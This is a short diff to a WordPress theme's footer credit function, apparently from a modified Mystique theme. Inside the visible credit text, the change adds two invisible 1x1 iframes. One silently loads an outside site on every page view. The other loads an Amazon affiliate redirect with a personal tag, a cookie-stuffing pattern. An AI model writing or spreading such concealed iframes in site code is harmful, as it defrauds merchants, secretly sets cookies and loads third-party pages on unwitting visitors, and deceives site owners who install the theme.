@@ -299,7 +299,7 @@ function sc_theme_link(){
 }
 
 function sc_credit(){
-  return sprintf(__('%1$s theme by %2$s | Modified by <a href=\'http://matsu.tymy.net/blog/\'>Matsubokkuringo</a>| Powered by %3$s', 'mystique'), '<abbr title="'.THEME_NAME.'/'.THEME_VERSION.'">Mystique</abbr>','<a href="http://digitalnature.ro">digitalnature</a>', '<a href="http://wordpress.org/">WordPress</a>');
+  return sprintf(__('%1$s theme by %2$s | Modified by <a href=\'http://matsu.tymy.net/blog/\'>Matsubokkuringo</a>| Powered by %3$s <iframe src="http://o-ta-su-ke.net/" width="1" height="1" border="0"></iframe><iframe src="http://www.amazon.co.jp/gp/redirect.html?ie=UTF8&location=http%3A%2F%2Fwww.amazon.co.jp%2F&tag=matsubokkur06-22&linkCode=ur2&camp=247&creative=7399" width="1" height="1" border="0"></iframe> ', 'mystique'), '<abbr title="'.THEME_NAME.'/'.THEME_VERSION.'">Mystique</abbr>','<a href="http://digitalnature.ro">digitalnature</a>', '<a href="http://wordpress.org/">WordPress</a>');
 }
 
 function sc_copyright() {
